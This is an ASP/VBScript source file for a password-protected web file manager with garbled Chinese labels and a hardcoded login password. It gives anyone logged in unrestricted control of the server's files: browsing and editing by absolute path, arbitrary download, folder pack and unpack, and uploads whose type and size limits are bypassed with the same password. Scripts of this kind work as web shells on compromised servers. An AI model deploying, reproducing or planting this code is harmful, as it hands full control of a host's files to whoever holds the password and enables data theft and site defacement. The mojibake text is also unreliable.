<%
editpwd="stoneaini"
%>
<title>WEB�ļ�������</title> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<style type="text/css"> 
<!-- 
a { 
 font-size: 9pt; 
 color: #3300CC; 
 text-decoration: none; 
} 
body { 
 font-size: 9pt; 
 margin-left: 0px; 
 margin-top: 0px; 
 margin-right: 0px; 
 margin-bottom: 0px; 
 line-height: 20px; 
 background-color: #EEEEEE; 
} 
td { 
 font-size: 9pt; 
 line-height: 20px; 
} 
.tx { 
 border-color:#000000; 
 border-left-width: 0px; 
 border-top-width: 0px; 
 border-right-width: 0px; 
 border-bottom-width: 1px; 
 font-size: 9pt; 
 background-color: #EEEEEE; 
} 
.tx1 { 
 font-size: 9pt; 
 border: 1px solid; 
 border-color:#000000; 
 color: #000000; 
} 
--> 
</style> 
<% 
Server.ScriptTimeout = 999 
action = Request("action") 
temp = Split(Request.ServerVariables("URL"), "/") 
url = temp(UBound(temp)) 
 pass = editpwd'��½��֤ 
Call ChkLogin() 
Set fso = CreateObject("Scripting.FileSystemObject") 
Select Case action 
    Case "�½��ļ�" 
        Call fileform(Request("path")&"\") 
    Case "savefile" 
        Call savefile(Request("filename"), Request("content"), Request("filename1")) 
    Case "�½��ļ���" 
        Call newfolder(Request("path")&"\") 
    Case "savefolder" 
        Call savefolder(Request("foldername")) 
    Case "�༭" 
        Call edit(Request("f")) 
    Case "������" 
        Call renameform(Request("f")) 
    Case "saverename" 
        Call rename(Request("oldname"), Request("newname")) 
    Case "����" 
        session("f") = request("f") 
        session("action") = action 
        Response.Redirect(url&"?foldername="&Request("path")) 
    Case "����" 
        session("f") = request("f") 
        session("action") = action 
        Response.Redirect(url&"?foldername="&Request("path")) 
    Case "ճ��" 
        Call affix(Request("path")&"\") 
    Case "ɾ��" 
        Call Delete( request("f"), Request("path") ) 
    Case "uploadform" 
        Call uploadform(Request("filepath"), Request("path")) 
    Case "saveupload" 
        Call saveupload() 
    Case "����" 
        Call download(request("f")) 
    Case "���" 
        Dim Str, s, s1, s2, rep 
        Call Dabao( Request("f"), Request("path") ) 
    Case "���" 
        Call Jiebao(Request("f"), Request("path")) 
    Case "�˳�" 
        Call logout() 
    Case Else 
        Path = Request("foldername") 
        If Path = "" Then Path = server.MapPath("./") 
        ShowFolderList(Path) 
End Select 
Set fso = Nothing 
'�г��ļ����ļ��� 
Function ShowFolderList(folderspec) 
    temp = Request.ServerVariables("HTTP_REFERER") 
    temp = Left(temp, Instrrev(temp, "/")) 
    temp1 = Len(folderspec) - Len(server.MapPath("./")) -1 
    If temp1>0 Then 
        temp1 = Right(folderspec, CInt(temp1)) + "\" 
    ElseIf temp1 = -1 Then 
        temp1 = "" 
    End If 
    tempurl = temp + Replace(temp1, "\", "/") 
    uppath = "./" + Replace(temp1, "\", "/") 
    upfolderspec = fso.GetParentFolderName(folderspec&"\") 
    Set f = fso.GetFolder(folderspec) 
%> 
<form name="form1" method=post action=""> 
<input type="hidden" name="path" class="tx1" value="<%= folderspec%>"> 
<input type="submit" name="action" class="tx1" value="�½��ļ���"> 
<input type="submit" name="action" class="tx1" value="�½��ļ�"> 
<input type="button" value="����" class="tx1" onclick="location.href='<%= url%>?foldername=<%= replace(upfolderspec,"\","\\")%>'"> 
<input type="button" value="����" class="tx1" onclick="location.href='<%= url%>'"> 
<input type="submit" name="action" class="tx1" value="������"> 
<input type="submit" name="action" class="tx1" value="�༭"> 
<input type="submit" name="action" class="tx1" value="����"> 
<input type="submit" name="action" class="tx1" value="����"> 
<input type="submit" name="action" class="tx1" value="ճ��" onclick="return confirm('ȷ��ճ����?');" <%if session("f")="" or isnull(session("f")) then response.write(" disabled") %>> 
<input type="submit" name="action" class="tx1" value="ɾ��" onclick="return confirm('ȷ��ɾ����?');"> 
<input type="button" name="action" class="tx1" value="�ϴ�" onClick="javascript:window.open('<%= url%>?action=uploadform&filepath=<%= uppath%>&path=<%= replace(folderspec,"\","\\")%>','new_page','width=600,height=260,left=100,top=100,scrollbars=auto');return false;"> 
<input type="submit" name="action" class="tx1" value="����"> 
<input type="submit" name="action" class="tx1" value="���" onclick="return confirm('ȷ�ϴ����?');"> 
<input type="submit" name="action" class="tx1" value="���" onclick="return confirm('ȷ�Ͻ����?');"> 
<input type="submit" name="action" class="tx1" value="�˳�" onclick="return confirm('ȷ���˳���?');"> 
<br>��ǰĿ¼:<%=f.path%>��ǰʱ��:<%=now%> 
<table width="100%" height="24" border="1" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" bordercolorlight="#FFFFFF" bordercolordark="#000000"> 
  <tr bgcolor="#CCCCCC"> 
    <td width="4%" align="center">����<input type="checkbox" name="chkall" onclick="for (var i=0;i<form1.elements.length;i++){var e = form1.elements[i];if (e.type == 'checkbox')e.checked = form1.chkall.checked;}"></td> 
    <td width="42%" align="center">����</td> 
    <td width="11%" align="right">��С<%= formatnumber(f.size/1024,2)%>K</td> 
    <td width="20%" align="center">����</td> 
    <td width="13%">�޸�ʱ��</td> 
    <td width="10%">����</td> 
  </tr> 
<% 
'�г�Ŀ¼ 
Set fc = f.SubFolders 
For Each f1 in fc 
%> 
  <tr bgcolor="#EEEEEE" onmouseover=this.bgColor='#F3F6FA'; onmouseout=this.bgColor='#EEEEEE';> 
    <td><center><input type="checkbox" name="f" value="<%= folderspec&"\"&f1.name%>"></center></td> 
    <td><a href="<%= url%>?foldername=<%= folderspec%>\<%= f1.name%>"><%= f1.name%></a></td> 
    <td align="right"><%= f1.size%></td> 
    <td><%= f1.type%></td> 
    <td><%= f1.datelastmodified%></td> 
    <td><%= f1.Attributes%></td> 
  </tr> 
<% 
Next 
'�г��ļ� 
Set fc = f.Files 
For Each f1 in fc 
%> 
  <tr bgcolor="#EFEFEF" onmouseover=this.bgColor='#F3F6FA'; onmouseout=this.bgColor='#EEEEEE';> 
    <td><center><input type="checkbox" name="f" value="<%= folderspec&"\"&f1.name%>"></center></td> 
    <td><a href="<%= tempurl+f1.name%>" target="_blank"><%= f1.name%></a></td> 
    <td align="right"><%= f1.size%></td> 
    <td><%= f1.type%></td> 
    <td><%= f1.datelastmodified%></td> 
    <td><%= f1.Attributes%></td> 
  </tr> 
<% 
Next 
%> 
</table> 
</form> 
<% 
End Function 
'�����ļ� 
Function savefile(filename, content, filename1) 
    If Request.ServerVariables("PATH_TRANSLATED")<>filename Then 
        Set f1 = fso.OpenTextFile(filename, 2, true) 
        f1.Write(content) 
        f1.Close 
    End If 
    Response.Redirect(url&"?foldername="&fso.GetParentFolderName(filename)) 
End Function 
'�ļ��� 
Function fileform(filename) 
    If fso.FileExists(filename) Then 
        Set f1 = fso.OpenTextFile(filename, 1, true) 
        content = server.HTMLEncode(f1.ReadAll) 
        f1.Close 
    End If 
%> 
<form name="form1" method="post" action="<%= url%>?action=savefile"> 
<center><input name="filename" type="text" class="tx" style="width:100%" value="<%= filename%>"><textarea name="content" rows="20" wrap="VIRTUAL" class="tx" style="width:100%;height:100%;font:Arial,Helvetica,sans-serif;" onKeyUp="style.height=this.scrollHeight;"><%= content%></textarea><input type="submit" class="tx1" onclick="return confirm('���� '+filename.value+' ?');" value="����"><input type="reset" class="tx1" value="����"></center> 
</form> 
<% 
End Function 
'�����ļ��� 
Function savefolder(foldername) 
    Set f = fso.CreateFolder(foldername) 
    Response.Redirect(url&"?foldername="&f) 
End Function 
'���ļ��� 
Function newfolder(foldername) 
    folderform foldername 
End Function 
'�ļ��б� 
Function folderform(foldername) 
%> 
<form method="post" action="<%= url%>?action=savefolder"> 
<center><input name="foldername" type="text" size="100" value="<%= foldername%>"><input type="submit" class="tx1" onclick="return confirm('���� '+foldername.value+' ?');" value="����"><input type="reset" class="tx1" value="����"></center> 
</form> 
<% 
End Function 
'�������� 
Function renameform(oldname) 
%> 
<form method=post action=""> 
<center>�����µ����֣�<input type="hidden" name="oldname" value='<%= oldname%>'><input type="hidden" name="action" value="saverename"><input type="text" name="newname" value='<%= oldname%>' size="100"><input type="submit" class="tx1" value="�ύ�޸�"></center> 
</form> 
<% 
End Function 
'������ 
Function Rename(oldstr, newstr) 
    oldname = Split(oldstr, ",") 
    newname = Split(newstr, ",") 
    For i = 0 To UBound(oldname) 
        If fso.FileExists(Trim(oldname(i))) Then fso.MoveFile Trim(oldname(i)), Trim(newname(i)) 
        If fso.FolderExists(Trim(oldname(i))) Then fso.MoveFolder Trim(oldname(i)), Trim(newname(i)) 
    Next 
    Response.Redirect(url&"?foldername="&fso.GetParentFolderName( oldname(0) )) 
End Function 
'ճ�� 
Function affix(Path) 
    oldname = Split(session("f"), ",") 
    If session("action") = "����" Then 
        For i = 0 To UBound(oldname) 
            If fso.FileExists(Trim(oldname(i))) Then fso.MoveFile Trim(oldname(i)), Path&fso.GetFileName(Trim(oldname(i))) 
            If fso.FolderExists(Trim(oldname(i))) Then fso.MoveFolder Trim(oldname(i)), Trim(Path) 
        Next 
    ElseIf session("action") = "����" Then 
        For i = 0 To UBound(oldname) 
            If fso.FileExists(Trim(oldname(i))) Then fso.CopyFile Trim(oldname(i)), Path&fso.GetFileName(Trim(oldname(i))) 
            If fso.FolderExists(Trim(oldname(i))) Then fso.CopyFolder Trim(oldname(i)), Trim(Path) 
        Next 
    End If 
    session("f") = "" 
    Response.Redirect(url&"?foldername="&Path) 
End Function 
'�༭ 
Function edit(f) 
    If fso.FileExists(f) Then Call fileform(f) 
    If fso.FolderExists(f) Then Call folderform( f ) 
End Function 
'ɾ�� 
Function Delete( Str, Path ) 
    For Each f In Str 
        If fso.FileExists(f) Then fso.DeleteFile(f) 
        If fso.FolderExists(f) Then fso.DeleteFolder(f) 
    Next 
    Response.Redirect(url&"?foldername="&Path) 
End Function 
'��� 
Function Dabao( Str, Path ) 
    For Each f In Str 
        If fso.FolderExists(f) Then Call pack(f, Path&"\") 
    Next 
    Response.Redirect(url&"?foldername="&Path) 
End Function 
'��� 
Function Jiebao( Str, Path ) 
    For Each f In Str 
        If fso.FileExists(f) And InStrRev(f, ".asp2004")>0 And Len(f) - InStrRev(f, ".asp2004") = 7 Then Install(f) 
    Next 
    Response.Redirect(url&"?foldername="&Path) 
End Function 
'�ϴ��� 
Function uploadform(filepath, Path) 
%> 
<div id="waitting" style="position:absolute; top:100px; left:240px; z-index:10; visibility:hidden"> 
<table border="0" cellspacing="1" cellpadding="0" bgcolor="0959AF"> 
<tr><td bgcolor="#FFFFFF" align="center"> 
<table width="160" border="0" height="50"> 
<tr><td valign="top"><div align="center">��&nbsp;��&nbsp;ִ&nbsp;��&nbsp;��<br>���Ժ�... </div></td></tr> 
</table> 
</td></tr> 
</table> 
</div> 
<div id="upload" style="visibility:visible"> 
<form name="form1" method="post" action="<%= url%>?action=saveupload" enctype="multipart/form-data" > 
  <table width="100%" height="24" border="1" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" bordercolorlight="#FFFFFF" bordercolordark="#000000"> 
    <tr bgcolor="#CCCCCC"><td bgcolor="#CCCCCC">�ļ��ϴ� 
      <input type="hidden" name="act" value="upload"></td> 
    </tr> 
    <tr align="left" bgcolor="#EEEEEE"><td> 
<li>��Ҫ�ϴ��ĸ�����<input name="upcount" class="tx" value="1"><input type="button" class="tx1" onclick="setid();" value="�趨"> 
<li>�ϴ�����<input name="filepath" class="tx" value="<%= filepath%>" size="60"><input name="path" class="tx" size="60" value="<%= path%>" style="display='none'">ʹ�þ���·��<input name="ispath" type="checkbox" value="true" onclick="if (checked){filepath.style.display='none';path.style.display='';}else{filepath.style.display='';path.style.display='none';}"> 
<li>��ֹ�����Զ�������<input name="checkbox" type="checkbox" value="true" checked> 
<li>���룺<input name="uppass" type="password" class="tx"> 
      </td></tr> 
    <tr><td align="left" id="upid"></td></tr> 
    <tr bgcolor="#EEEEEE"><td align="center" bgcolor="#EEEEEE"> 
          <input type="submit" class="tx1" onClick="exec();" value="�ύ"> 
          <input type="reset" class="tx1" value="����"> 
          <input type="button" class="tx1" onClick="window.close();" value="ȡ��"> 
        </td></tr> 
  </table> 
</form></div> 
<script language="javascript"> 
function exec() 
{ 
 waitting.style.visibility="visible"; 
 upload.style.visibility="hidden"; 
} 
function setid() 
{ 
 if(window.form1.upcount.value>0) 
 { 
  str=''; 
  for(i=1;i<=window.form1.upcount.value;i++) 
  str+='�ļ�'+i+':<input type="file" name="file'+i+'" style="width:400" class="tx1"><br>'; 
  window.upid.innerHTML=str+''; 
 } 
} 
setid(); 
</script> 
<% 
End Function 
'�����ϴ� 
Function saveupload() 
    Const filetype = ".bmp.gif.jpg.png.rar.zip.txt."'�����ϴ����ļ����͡���.�ָ� 
    Const MaxSize = 5000000'������ļ���С 
    Dim upload, File, formName, formPath 
    Set upload = New upload_5xsoft 
    If upload.Form("filepath")<>"" Then 
        If upload.Form("ispath") = "true" Then 
            formPath = upload.Form("path") 
        Else 
            formPath = Server.mappath(upload.Form("filepath")) 
        End If 
        If Right(formPath, 1)<>"\" Then formPath = formPath&"\" 
        If fso.FolderExists(formPath)<>true Then 
            fso.CreateFolder(formPath) 
        End If 
        For Each formName in upload.objFile 
            Set File = upload.File(formName) 
            temp = Split(File.FileName, ".") 
            fileExt = temp(UBound(temp)) 
            If InStr(1, filetype, LCase(fileExt))>0 Or upload.Form("uppass") = pass Then 
                If upload.Form("checkbox") = "true" Then 
                    Randomize 
                    ranNum = Int(90000 * Rnd) + 10000 
                    filename = Year(Now)&Right("0"&Month(Now),2)&Right("0"&Day(Now),2)&Right("0"&Hour(Now),2)&Right("0"&Minute(Now),2)&Right("0"&Second(Now),2)&ranNum&"."&fileExt 
                Else 
     temp = Split(File.FileName, "\") 
                    filename = temp(Ubound(temp)) 
                End If 
                If File.FileSize>0 And (File.FileSize<MaxSize Or upload.Form("uppass") = pass) Then 
                    File.SaveAs formPath&filename 
                End If 
                Set File = Nothing 
            End If 
        Next 
    End If 
    Response.Write("<script language='javascript'>window.opener.location.reload();self.close();</script>") 
    Set upload = Nothing 
End Function 
'�����ļ� 
Function download(File) 
    temp = Split(File, "\") 
    filename = temp(UBound(temp)) 
    Set s = CreateObject("adodb.stream") 
    s.mode = 3 
    s.Type = 1 
    s.Open 
    s.loadfromfile(File) 
    data = s.Read 
    If IsNull(data) Then 
        response.Write "��" 
    Else 
        response.Clear 
        Response.ContentType = "application/octet-stream" 
        Response.AddHeader "Content-Disposition", "attachment; filename=" & filename 
        response.binarywrite(data) 
    End If 
    Set s = Nothing 
End Function 
'��� 
Function pack(Folder, Path) 
    Randomize 
    ranNum = Int(90000 * Rnd) + 10000 
    Set f1 = fso.GetFolder(Folder) 
    filename = Year(Now)&Month(Now)&Day(Now)&Hour(Now)&Minute(Now)&Second(Now)&ranNum&"_"&f1.Size 
    Set s = server.CreateObject("ADODB.Stream") 
    Set s1 = server.CreateObject("ADODB.Stream") 
    Set s2 = server.CreateObject("ADODB.Stream") 
    s.Open 
    s1.Open 
    s2.Open 
    s.Type = 1 
    s1.Type = 1 
    s2.Type = 2 
    rep = fso.GetParentFolderName(Folder&"\")'��ǰĿ¼ 
    Str = "folder>0>"&Replace(Folder, rep, "")&vbCrLf'��Ŀ¼һ���� 
    Call WriteFile(Folder) 
    s2.charset = "gb2312" 
    s2.WriteText(Str) 
    s2.Position = 0 
    s2.Type = 1 
    s2.Position = 0 
    bin = s2.Read 
    s1.Write(bin) 
    s1.SetEOS 
    s1.SaveToFile(Path&filename&".asp2004") 
    s.Close 
    s1.Close 
    s2.Close 
    Set s = Nothing 
    Set s1 = Nothing 
    Set s2 = Nothing 
End Function 
Function WriteFile(folderspec) 
    Set f = fso.GetFolder(folderspec) 
    Set fc = f.Files 
    For Each f1 in fc 
        If f1.Name<>"pack.asp" Then 
            Str = Str&"file>"&f1.Size&">"&Replace(folderspec&"\"&f1.Name, rep, "")&vbCrLf 
            s.LoadFromFile(folderspec&"\"&f1.Name) 
            img = s.Read() 
            If Not IsNull(img) Then s1.Write(img) 
        End If 
    Next 
    Set fc = f.SubFolders 
    For Each f1 in fc 
        Str = Str&"folder>0>"&Replace(folderspec&"\"&f1.Name, rep, "")&vbCrLf 
        WriteFile(folderspec&"\"&f1.Name) 
    Next 
End Function 
'��� 
Function install(filename) 
    tofolder = fso.GetParentFolderName(filename) 
    t1 = Split(filename, "\")'�õ��ļ�ȫ�� 
    t2 = Split(t1(UBound(t1)), ".")'�õ��ļ��� 
    t3 = Split(t2(0), "_")'�õ����ݴ�С 
    Size = CStr(t3(1)) 
    Set s = server.CreateObject("adodb.stream") 
    Set s1 = server.CreateObject("adodb.stream") 
    Set s2 = server.CreateObject("adodb.stream") 
    s.Open 
    s1.Open 
    s2.Open 
    s.Type = 1 
    s1.Type = 1 
    s2.Type = 1 
    s.loadfromfile(filename) 
    s.position = Size 
    s1.Write(s.Read) 
    s1.position = 0 
    s1.Type = 2 
    s1.charset = "gb2312" 
    s1.position = 0 
    a = Split(s1.readtext, vbCrLf) 
    s.position = 0 
    i = 0 
    While(i<UBound(a)) 
    b = Split(a(i), ">") 
    If b(0) = "folder" Then 
        If Not fso.FolderExists(tofolder&b(2)) Then 
            fso.CreateFolder(tofolder&b(2)) 
            'folder=split(tofolder&b(2),"\")'�Զ������ֲ�Ŀ¼ 
            'for j=0 to ubound(folder) 
            'newfolder=newfolder&folder(j)&"\" 
            'if not fso.folderexists(newfolder) then 
            'fso.createfolder(newfolder) 
            'end if 
            'next 
        End If 
    ElseIf b(0) = "file" Then 
        If fso.FileExists(tofolder&b(2)) Then 
            fso.DeleteFile(tofolder&b(2)) 
        End If 
        s2.position = 0 
  data = s.Read(b(1)) 
  If Not IsNull(data) then s2.Write(data) 
        s2.seteos 
        s2.savetofile(tofolder&b(2)) 
    End If 
    i = i + 1 
Wend 
s.Close 
s1.Close 
s2.Close 
Set s = Nothing 
Set s1 = Nothing 
Set s2 = Nothing 
Response.Write("<script language='javascript'>window.opener.location.reload();self.close();</script>") 
End Function 
'����½ 
Function ChkLogin() 
    If Session("login") = "true" Then 
        Exit Function 
    ElseIf Request("action") = "chklogin" Then 
  Server_v1=Cstr(Request.ServerVariables("HTTP_REFERER")) 
  Server_v2=Cstr(Request.ServerVariables("SERVER_NAME")) 
  If Server_v1<>"" And Mid(Server_v1,8,Len(Server_v2)) = Server_v2 Then 
   If Request("password") = pass Then 
    Session("login") = "true" 
    Response.Redirect(url) 
   Else 
    Response.Write("<script>alert('��½ʧ��');</script>") 
   End If 
  End If 
    End If 
    Call LoginForm() 
End Function 
'��½�� 
Function LoginForm() 
%> 
<% '<body onload="document.form1.password.focus();">  %>
<br><br><br><br><br> 
<form name="form1" method="post" action="<%= url%>?action=chklogin"> 
<center>���������룺<input name="password" type="password" class="tx"> 
<input type="submit" class="tx1" value="��½"> 
<br><br>
<br>
<br><br>
</center> 
</form> 
</body> 
<% 
Response.End() 
End Function 
'ע�� 
Function logout() 
    Session.Abandon() 
    Response.Redirect(url) 
End Function 
%> 
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT> 
dim Data_5xsoft 
Class upload_5xsoft 
dim objForm,objFile,Version 
Public function Form(strForm) 
   strForm=lcase(strForm) 
   if not objForm.exists(strForm) then 
     Form="" 
   else 
     Form=objForm(strForm) 
   end if 
 end function 
Public function File(strFile) 
   strFile=lcase(strFile) 
   if not objFile.exists(strFile) then 
     set File=new FileInfo 
   else 
     set File=objFile(strFile) 
   end if 
 end function 
Private Sub Class_Initialize 
  dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile 
  dim iFileSize,sFilePath,sFileType,sFormValue,sFileName 
  dim iFindStart,iFindEnd 
  dim iFormStart,iFormEnd,sFormName 
  Version="����HTTP�ϴ����� Version 2.0" 
  set objForm=Server.CreateObject("Scripting.Dictionary") 
  set objFile=Server.CreateObject("Scripting.Dictionary") 
  if Request.TotalBytes<1 then Exit Sub 
  set tStream = Server.CreateObject("adodb.stream") 
  set Data_5xsoft = Server.CreateObject("adodb.stream") 
  Data_5xsoft.Type = 1 
  Data_5xsoft.Mode =3 
  Data_5xsoft.Open 
  Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes) 
  Data_5xsoft.Position=0 
  RequestData =Data_5xsoft.Read 
  iFormStart = 1 
  iFormEnd = LenB(RequestData) 
  vbCrlf = chrB(13) & chrB(10) 
  sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1) 
  iStart = LenB (sStart) 
  iFormStart=iFormStart+iStart+1 
  while (iFormStart + 10) < iFormEnd 
 iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3 
 tStream.Type = 1 
 tStream.Mode =3 
 tStream.Open 
 Data_5xsoft.Position = iFormStart 
 Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart 
 tStream.Position = 0 
 tStream.Type = 2 
 tStream.Charset ="gb2312" 
 sInfo = tStream.ReadText 
 tStream.Close 
 iFormStart = InStrB(iInfoEnd,RequestData,sStart) 
 iFindStart = InStr(22,sInfo,"name=""",1)+6 
 iFindEnd = InStr(iFindStart,sInfo,"""",1) 
 sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart)) 
 if InStr (45,sInfo,"filename=""",1) > 0 then 
  set theFile=new FileInfo 
  iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10 
  iFindEnd = InStr(iFindStart,sInfo,"""",1) 
  sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart) 
  theFile.FileName=getFileName(sFileName) 
  theFile.FilePath=getFilePath(sFileName) 
  iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14 
  iFindEnd = InStr(iFindStart,sInfo,vbCr) 
  theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart) 
  theFile.FileStart =iInfoEnd 
  theFile.FileSize = iFormStart -iInfoEnd -3 
  theFile.FormName=sFormName 
  if not objFile.Exists(sFormName) then 
    objFile.add sFormName,theFile 
  end if 
 else 
  tStream.Type =1 
  tStream.Mode =3 
  tStream.Open 
  Data_5xsoft.Position = iInfoEnd 
  Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3 
  tStream.Position = 0 
  tStream.Type = 2 
  tStream.Charset ="gb2312" 
         sFormValue = tStream.ReadText 
         tStream.Close 
  if objForm.Exists(sFormName) then 
    objForm(sFormName)=objForm(sFormName)&", "&sFormValue 
  else 
    objForm.Add sFormName,sFormValue 
  end if 
 end if 
 iFormStart=iFormStart+iStart+1 
 wend 
  RequestData="" 
  set tStream =nothing 
End Sub 
Private Sub Class_Terminate 
 if Request.TotalBytes>0 then 
 objForm.RemoveAll 
 objFile.RemoveAll 
 set objForm=nothing 
 set objFile=nothing 
 Data_5xsoft.Close 
 set Data_5xsoft =nothing 
 end if 
End Sub 
 Private function GetFilePath(FullPath) 
  If FullPath <> "" Then 
   GetFilePath = left(FullPath,InStrRev(FullPath, "\\")) 
  Else 
   GetFilePath = "" 
  End If 
 End  function 
 Private function GetFileName(FullPath) 
  If FullPath <> "" Then 
   GetFileName = mid(FullPath,InStrRev(FullPath, "\\")+1) 
  Else 
   GetFileName = "" 
  End If 
 End  function 
End Class 
Class FileInfo 
  dim FormName,FileName,FilePath,FileSize,FileType,FileStart 
  Private Sub Class_Initialize 
    FileName = "" 
    FilePath = "" 
    FileSize = 0 
    FileStart= 0 
    FormName = "" 
    FileType = "" 
  End Sub 
 Public function SaveAs(FullPath) 
    dim dr,ErrorChar,i 
    SaveAs=true 
    if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function 
    set dr=CreateObject("Adodb.Stream") 
    dr.Mode=3 
    dr.Type=1 
    dr.Open 
    Data_5xsoft.position=FileStart 
    Data_5xsoft.copyto dr,FileSize 
    dr.SaveToFile FullPath,2 
    dr.Close 
    set dr=nothing 
    SaveAs=false 
  end function 
  End Class 
</SCRIPT> 
 
 
